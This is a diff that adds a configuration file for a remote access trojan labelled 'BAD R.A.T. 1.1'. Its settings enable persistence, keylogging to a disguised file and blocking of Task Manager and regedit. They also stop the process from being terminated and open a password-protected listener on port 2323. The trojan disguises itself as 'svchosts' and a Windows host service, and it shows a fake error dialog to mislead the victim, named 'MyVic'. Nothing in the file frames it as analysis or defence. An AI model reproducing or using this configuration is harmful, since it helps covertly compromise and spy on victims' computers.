@@ -1,0 +1,34 @@
+//[BAD R.A.T.] 1.1
+[Setting]
+modi=false
+run=true
+runservice=true
+run2=true
+runservice2=true
+winlog=true
+localaccess=true
+meltserver=true
+noregedit=true
+notaskmanager=true
+reverseconnect=false
+balloon=false
+balloonsize=1242
+nodoscmd=true
+antiterminat=true
+waitreboot=true
+port=2323
+pass=passwort
+target=MyVic
+regname=Generic Host Process for Win32 Services
+installdir =[%SYSDIR]
+servername=svchosts
+exe=.exe
+keylogdat=winsyss.dat
+usefakemsg=true
+fakemsg=Error 4323 !|Can't run this programm!|"0x0fab6329" in "0x00000000"
+fakehead=Error!
+icon=c
+usesin=false
+sinip=127.0.0.1
+sinport=2324
+
